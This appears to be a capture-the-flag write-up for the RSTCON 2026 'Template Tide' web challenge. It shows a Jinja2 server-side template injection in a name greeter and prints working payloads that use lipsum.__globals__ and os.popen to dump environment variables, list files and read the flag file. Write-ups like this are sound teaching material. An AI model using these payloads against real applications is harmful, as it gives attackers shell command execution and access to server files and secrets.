---
title: "RSTCON 2026 – Template Tide"
date: 2026-10-25 12:15:00 +0200
categories: [Events, RSTCON 2026]
tags: [web, ssti, jinja2, template-injection, rce, lipsum, os-popen]
media_subpath: /assets/img/posts/
excerpt: "Server-side template injection in a tide-report greeter — confirm the template eval, then read the flag through os.popen."
---

{% raw %}
## **Challenge Information**
**Title:**  Template Tide  
**Category**:  web exploitation  
**Platform:**  RSTCON  
**Difficulty:**  easy  
**Tags:**  web, SSTI, Jinja2, template-injection, RCE, lipsum, os.popen  
**Date solved:**  25/10/2026 (DD/MM/YYYY)  
**Challenge Description**: The hydro dashboard has a friendly little tide report that greets you by name. It is a bit too friendly with what you give it.  

Mirror 1: `http://18.215.143.250:5001`  
Mirror 2: `http://18.145.136.91:5001`  
**Files provided**:  -  

## **Environment and Tools** 
**Operating System**:  Kali Linux (Parallels)  
**Tools/ Software**:  Brave Browser  
**Programming Languages (if any)**:  bash  

## **Recognition Pattern**
- An input box that greets you back by name, and a hint that it accepts {{name}} formatting => Server Side Template Injection (SSTI)
- {{7*7}} rendering as 49 confirms it => the input is evaluated as a template

## **Approach and Methodology**
Once i connected to the website, there was a user input box where you were invited to enter your name. There was also a hint which said it accepts {{name}} formatting, so that was a big clue that it accepts SSTI injection.

I tested this theory by using {{7*7}} and the output was 49 as expected.

From here it was all about where the flag could be. I tried looking inside the environment by using:
```bash
{{lipsum.__globals__["o"~"s"].environ}}
```

But nothing interesting or useful showed up.

The os that allows reading the environment can also let us execute shell commands, so the next move was to search for the flag file:
```python3
{{ lipsum.__globals__.os.popen('pwd; ls -la').read() }}
```

Once the flag file was located, all that was left to do was to print it.

## **Solution and Flag Retrieval**
Final Exploit / Command Used: 
```bash
{{ lipsum.__globals__.os.popen('cat /app/flag.txt').read() }}
```


## **Lessons Learned**
- you can use .os.popen to execute shell in SSTI injection and look through the file system
- writeups should be written as fast as possible after solving the ctf, to still have access to the materials

## **References**
- PayloadsAllTheThings — SSTI (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
{% endraw %}
